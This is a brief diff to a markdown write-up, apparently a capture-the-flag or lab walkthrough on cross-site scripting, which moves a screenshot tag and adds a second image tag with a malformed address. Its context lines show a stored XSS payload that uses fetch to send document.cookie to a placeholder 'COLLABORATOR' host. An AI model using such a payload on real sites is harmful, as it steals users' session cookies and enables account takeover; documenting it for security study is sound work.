@@ -85,11 +85,9 @@ fetch("http://COLLABORATOR/?"+document.cookie)
 </script>
 
 titre=abcd&message=xxxx
-
-<img width="1261" height="444" alt="image" src="https://github.com/user-attachments/assets/bf0944e7-6cb0-4946-933e-cfc77d7e131c" />
-
 ```
-
+<img width="1261" height="444" alt="image" src="https://github.com/user-attachments/assets/bf0944e7-6cb0-4946-933e-cfc77d7e131c" />
+<img width="1261" height="444" alt="image" src=127.0.01 />
 ---
 
 # Why It Works
